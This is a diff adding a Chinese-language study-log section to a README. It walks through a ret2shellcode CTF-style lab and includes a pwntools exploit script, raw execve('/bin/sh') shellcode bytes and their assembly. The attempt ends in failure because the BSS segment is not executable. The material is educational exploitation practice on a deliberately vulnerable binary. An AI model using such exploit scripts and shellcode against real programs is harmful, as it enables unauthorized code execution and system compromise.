@@ -128,3 +128,83 @@ proc.interactive()
 ![image-20230414141054749](./README.assets/image-20230414141054749.png)
 
 成功启动了Shell！我尝试将ret2text文件设置为setuid然后再进行相同的攻击，但是并没有得到root权限的shell，等有时间再研究一下。
+
+## 02 ret2shellcode
+
+![image-20230414143108072](./README.assets/image-20230414143108072.png)
+
+啥都没开，对味了。我还尝试在Ubuntu 22.04下随便用GCC编译了一个C程序，看一下默认的安全策略，结果全绿，顿时感觉自己现在就是在路边玩泥巴...
+
+反编译的main()函数代码如下：
+
+![image-20230414143036380](./README.assets/image-20230414143036380.png)
+
+流程和上一个实验相似，但是没有现成的system("/bin/sh")可以用了，需要人工构造。而这个人工构造的shellcode需要放在一个能持续存在的地方（不能放在临时变量里面，因为mian()函数返回之后栈帧里的数据就弹出去了），因此候选目标是未释放的堆/BSS段/DATA段。“恰好”main()函数里面变量v4的值会被复制到缓冲区buf2里面，通过IDA可以看到buf2位于BSS段：
+
+![image-20230414172221895](./README.assets/image-20230414172221895.png)
+
+因为`strncpy(buf2, v4, 100)`，我们输入的数据的前100个字节就会被直接放到BSS段的0x0804A080这个位置，足够放下一段shellcode。那么需要输入到变量v4的数据就是“shellcode+填充+0x0804A080”。
+
+下一步就是确定“shellcode+填充”的总长度，和之前一样，使用cyclic：
+
+![image-20230414143752634](./README.assets/image-20230414143752634.png)
+
+在EIP寄存器的值还是“daab”，也就是说变量v4到main()函数栈帧返回地址的距离和上一个实验一样，还是112字节。
+
+下面来构造脚本：
+
+```python
+from pwn import *
+
+
+pwn_obj = process("./ret2shellcode")
+shellcode = asm(shellcraft.sh()).ljust(112, b"\x00") # 总长度112，左对齐
+target_addr = 0x0804A080
+pwn_obj.sendline(shellcode + p32(target_addr))
+pwn_obj.interactive()
+```
+
+执行结果：
+
+![image-20230414173439543](./README.assets/image-20230414173439543.png)
+
+图中的红色dollar符号是pwntools自带的，并不是成功获取到了shell，出大问题了，开始检查...
+
+首先是shellcode本身：
+
+```
+b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80####################################################################'
+```
+
+```
+/* execve(path='/bin///sh', argv=['sh'], envp=0) */
+/* push b'/bin///sh\x00' */
+push 0x68
+push 0x732f2f2f
+push 0x6e69622f
+mov ebx, esp
+/* push argument array ['sh\x00'] */
+/* push 'sh\x00\x00' */
+push 0x1010101
+xor dword ptr [esp], 0x1016972
+xor ecx, ecx
+push ecx /* null terminate */
+push 4
+pop ecx
+add ecx, esp
+push ecx /* 'sh\x00' */
+mov ecx, esp
+xor edx, edx
+/* call execve() */
+push SYS_execve /* 0xb */
+pop eax
+int 0x80
+```
+
+是使用execve调用shell的很正常的shellcode。
+
+然后检查一下buf2那里是不是不可执行，使用`breakpoint main`在main函数那里打断点，`run`运行到断点之后使用`vmmap`查看内存情况：
+
+![image-20230414174534940](./README.assets/image-20230414174534940.png)
+
+缓冲区buf2位于0x0804A080，在区间0x804a000~0x804b000内，这个区间的内存的信息显示在第三行，可以读写，但是不能执行。原来是自从Linux内核5.x之后，内存的BSS段默认没有可执行权限。
